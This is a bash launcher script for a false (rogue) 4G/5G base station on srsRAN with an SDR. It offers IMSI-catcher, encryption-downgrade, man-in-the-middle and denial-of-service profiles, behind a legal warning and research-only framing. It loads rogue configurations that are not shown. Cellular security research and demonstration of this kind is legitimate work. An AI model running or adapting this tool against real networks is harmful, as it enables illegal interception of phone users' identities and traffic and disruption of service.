#!/bin/bash
#####################################################################
# START FALSE BASE STATION
# 
# Starts the false base station with configurable delay timer
# Enables demonstration of UE handover from legitimate to false BS
#
# WARNING: For RESEARCH and EDUCATIONAL purposes ONLY
#####################################################################

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Default configuration
DEFAULT_DELAY=15
DEFAULT_MODE="4g"
DEFAULT_ATTACK="imsi_catcher"

# Configuration directory
CONFIG_DIR="/etc/srsran/false"
ATTACK_PROFILES_DIR="/opt/attack_profiles"
LOG_DIR="/tmp/false_bs_logs"

#####################################################################
# Functions
#####################################################################

print_banner() {
    echo -e "${MAGENTA}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║                                                            ║"
    echo "║           FALSE BASE STATION LAUNCHER                      ║"
    echo "║                                                            ║"
    echo "║  ⚠️  WARNING: Research and Educational Use Only  ⚠️         ║"
    echo "║                                                            ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_legal_warning() {
    echo -e "${RED}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║                     LEGAL WARNING                          ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    echo "║                                                            ║"
    echo "║  Operating a false base station without authorization     ║"
    echo "║  is ILLEGAL in most jurisdictions and may result in:      ║"
    echo "║                                                            ║"
    echo "║  • Criminal prosecution                                   ║"
    echo "║  • Heavy fines                                            ║"
    echo "║  • Imprisonment                                           ║"
    echo "║  • Equipment seizure                                      ║"
    echo "║                                                            ║"
    echo "║  This software is for CONTROLLED RESEARCH ENVIRONMENTS    ║"
    echo "║  with proper authorization and isolated networks only.    ║"
    echo "║                                                            ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
}

show_usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -d, --delay <seconds>     Delay before starting (default: 15)"
    echo "  -m, --mode <4g|5g>        Network mode (default: 4g)"
    echo "  -a, --attack <profile>    Attack profile (default: imsi_catcher)"
    echo "  -n, --no-delay            Start immediately without delay"
    echo "  -c, --config <file>       Custom configuration file"
    echo "  -v, --verbose             Verbose output"
    echo "  -h, --help                Show this help message"
    echo ""
    echo "Attack Profiles:"
    echo "  imsi_catcher              Capture IMSI/IMEI identities"
    echo "  downgrade                 Force weak encryption"
    echo "  mitm                      Man-in-the-middle interception"
    echo "  dos                       Denial of service"
    echo ""
    echo "Examples:"
    echo "  $0                                      # Default: 15s delay, 4G, IMSI catcher"
    echo "  $0 -d 20 -m 5g -a downgrade            # 20s delay, 5G, downgrade attack"
    echo "  $0 --no-delay -m 4g -a mitm            # Immediate start, 4G, MITM"
    echo ""
}

pre_flight_checks() {
    echo -e "${BLUE}Running pre-flight checks...${NC}"
    echo ""
    
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}✗ Must run as root or with sudo${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Running as root${NC}"
    
    # Check SDR device
    echo -n "Checking for SDR device... "
    if uhd_find_devices 2>/dev/null | grep -q "Device Address"; then
        echo -e "${GREEN}✓ SDR device detected${NC}"
    else
        echo -e "${RED}✗ No SDR device found${NC}"
        echo "  Please connect LibreSDR B220 mini"
        exit 1
    fi
    
    # Check configuration files
    echo -n "Checking configuration files... "
    if [ "$MODE" == "4g" ]; then
        if [ -f "$CONFIG_DIR/enb_4g_rogue.conf" ]; then
            echo -e "${GREEN}✓ 4G configuration found${NC}"
        else
            echo -e "${RED}✗ 4G configuration not found${NC}"
            exit 1
        fi
    else
        if [ -f "$CONFIG_DIR/gnb_5g_rogue.yml" ]; then
            echo -e "${GREEN}✓ 5G configuration found${NC}"
        else
            echo -e "${RED}✗ 5G configuration not found${NC}"
            exit 1
        fi
    fi
    
    # Check attack profile
    echo -n "Checking attack profile... "
    if [ -f "$ATTACK_PROFILES_DIR/$ATTACK_PROFILE.conf" ]; then
        echo -e "${GREEN}✓ Attack profile found: $ATTACK_PROFILE${NC}"
        source "$ATTACK_PROFILES_DIR/$ATTACK_PROFILE.conf"
    else
        echo -e "${YELLOW}⚠ Attack profile not found, using default${NC}"
    fi
    
    # Create log directory
    mkdir -p "$LOG_DIR"
    echo -e "${GREEN}✓ Log directory ready: $LOG_DIR${NC}"
    
    echo ""
    echo -e "${GREEN}✓ All pre-flight checks passed${NC}"
    echo ""
}

display_configuration() {
    echo -e "${BLUE}Configuration Summary:${NC}"
    echo "┌─────────────────────────────────────────────┐"
    echo "│ Network Mode:    ${MODE^^}                        "
    echo "│ Attack Profile:  $ATTACK_PROFILE                 "
    echo "│ Startup Delay:   ${DELAY} seconds              "
    echo "│ Config File:     $([ -n "$CUSTOM_CONFIG" ] && echo "$CUSTOM_CONFIG" || echo "Default")"
    echo "└─────────────────────────────────────────────┘"
    echo ""
}

countdown_timer() {
    local delay=$1
    
    echo -e "${YELLOW}False base station will start in ${delay} seconds...${NC}"
    echo ""
    echo "This delay allows you to:"
    echo "  • Start the legitimate base station first"
    echo "  • Connect UE to legitimate BS"
    echo "  • Observe the handover process"
    echo ""
    echo "Press Ctrl+C to cancel"
    echo ""
    
    for ((i=delay; i>0; i--)); do
        if [ $i -le 5 ]; then
            echo -e "${RED}⏱  Starting in $i seconds...${NC}"
        elif [ $i -le 10 ]; then
            echo -e "${YELLOW}⏱  Starting in $i seconds...${NC}"
        else
            echo -e "${BLUE}⏱  Starting in $i seconds...${NC}"
        fi
        sleep 1
    done
    
    echo ""
    echo -e "${GREEN}🚀 Launching false base station NOW!${NC}"
    echo ""
}

start_4g_false_bs() {
    echo -e "${YELLOW}Starting 4G False Base Station (rogue eNodeB)...${NC}"
    echo ""
    
    local config_file="${CUSTOM_CONFIG:-$CONFIG_DIR/enb_4g_rogue.conf}"
    local log_file="$LOG_DIR/false_enb_$(date +%Y%m%d_%H%M%S).log"
    
    echo "Configuration: $config_file"
    echo "Log file: $log_file"
    echo ""
    
    # Start eNodeB
    echo "Executing: srsenb $config_file"
    srsenb "$config_file" 2>&1 | tee "$log_file"
}

start_5g_false_bs() {
    echo -e "${YELLOW}Starting 5G False Base Station (rogue gNodeB)...${NC}"
    echo ""
    
    local config_file="${CUSTOM_CONFIG:-$CONFIG_DIR/gnb_5g_rogue.yml}"
    local log_file="$LOG_DIR/false_gnb_$(date +%Y%m%d_%H%M%S).log"
    
    echo "Configuration: $config_file"
    echo "Log file: $log_file"
    echo ""
    
    # Start gNodeB
    echo "Executing: gnb -c $config_file"
    gnb -c "$config_file" 2>&1 | tee "$log_file"
}

setup_attack_mode() {
    echo -e "${MAGENTA}Configuring attack mode: $ATTACK_PROFILE${NC}"
    
    # Source attack profile if exists
    if [ -f "$ATTACK_PROFILES_DIR/$ATTACK_PROFILE.conf" ]; then
        source "$ATTACK_PROFILES_DIR/$ATTACK_PROFILE.conf"
        
        # Display attack description
        if [ -n "$ATTACK_DESCRIPTION" ]; then
            echo ""
            echo "Description: $ATTACK_DESCRIPTION"
        fi
        
        # Setup logging
        if [ -n "$CAPTURE_LOG" ]; then
            echo "Capture log: $CAPTURE_LOG"
            touch "$CAPTURE_LOG"
        fi
        
        # Setup PCAP capture
        if [ "$PCAP_ENABLED" == "true" ] && [ -n "$PCAP_FILE" ]; then
            echo "PCAP capture: $PCAP_FILE"
        fi
    fi
    
    echo ""
}

#####################################################################
# Main Script
#####################################################################

# Parse command line arguments
DELAY=$DEFAULT_DELAY
MODE=$DEFAULT_MODE
ATTACK_PROFILE=$DEFAULT_ATTACK
NO_DELAY=false
CUSTOM_CONFIG=""
VERBOSE=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--delay)
            DELAY="$2"
            shift 2
            ;;
        -m|--mode)
            MODE="$2"
            shift 2
            ;;
        -a|--attack)
            ATTACK_PROFILE="$2"
            shift 2
            ;;
        -n|--no-delay)
            NO_DELAY=true
            shift
            ;;
        -c|--config)
            CUSTOM_CONFIG="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            print_banner
            show_usage
            exit 0
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            show_usage
            exit 1
            ;;
    esac
done

# Validate mode
if [[ "$MODE" != "4g" && "$MODE" != "5g" ]]; then
    echo -e "${RED}Error: Invalid mode '$MODE'. Must be '4g' or '5g'${NC}"
    exit 1
fi

# Display banner and warning
print_banner
print_legal_warning

# Require confirmation
read -p "Do you understand and accept the legal warning? (yes/no): " confirmation
if [[ "$confirmation" != "yes" ]]; then
    echo -e "${RED}Aborted by user${NC}"
    exit 1
fi
echo ""

# Run pre-flight checks
pre_flight_checks

# Display configuration
display_configuration

# Setup attack mode
setup_attack_mode

# Countdown timer (unless --no-delay specified)
if [ "$NO_DELAY" == false ]; then
    countdown_timer $DELAY
else
    echo -e "${YELLOW}⚠️  Starting immediately (no delay)${NC}"
    echo ""
fi

# Start false base station
if [ "$MODE" == "4g" ]; then
    start_4g_false_bs
else
    start_5g_false_bs
fi

